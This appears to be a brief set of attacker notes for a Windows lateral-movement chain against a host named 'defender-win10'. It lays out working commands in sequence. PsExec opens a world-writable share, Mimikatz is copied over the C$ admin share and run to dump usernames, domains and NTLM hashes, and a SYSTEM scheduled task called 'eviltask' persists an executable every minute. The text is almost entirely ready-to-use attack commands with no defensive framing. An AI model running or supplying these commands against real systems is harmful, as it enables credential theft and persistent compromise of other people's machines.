"remotly run"
"Create Share"
~\exploit\pstools\psexec.exe  \\defender-win10 cmd.exe /c "mkdir ~\exploit &net share ShareName=~\exploit /grant:Everyone,FULL "

"Copy Mimikatz"
net use z: \\defender-win10\c$\users\dddolev\exploit
xcopy ~\exploit\mimikatz\ z:\mimikatz\ /E /y


"Run Mimikatz"
~\exploit\pstools\psexec.exe \\defender-win10 powershell -command "~\exploit\mimikatz\mimikatz.exe log privilege::debug sekurlsa::logonpasswords exit | select-string -pattern '\*\s+(Username|Domain|NTLM)\s+: .*'> ~\exploit\mimiout.txt"'



"Creating precistance"
schtasks /create /sc minute /mo 1 /tn "eviltask" /tr ~\exploit\evil.exe /ru "SYSTEM" /s defender-win10